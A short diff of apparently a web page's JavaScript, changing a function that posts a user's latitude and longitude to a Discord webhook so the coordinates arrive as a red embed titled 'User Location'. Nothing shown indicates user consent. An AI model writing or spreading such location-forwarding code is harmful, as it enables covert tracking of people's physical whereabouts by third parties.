@@ -15,8 +15,12 @@ function sendDataToDiscord(location) {
     
     // Data to be sent
     var data = {
-        content: 'May we be sigma?',
-        location: location
+        content: 'User Location:',
+        embeds: [{
+            title: 'User Location',
+            description: 'Latitude: ' + location.latitude + ', Longitude: ' + location.longitude,
+            color: 16711680 // Red color
+        }]
     };
     
     // Send data to Discord webhook
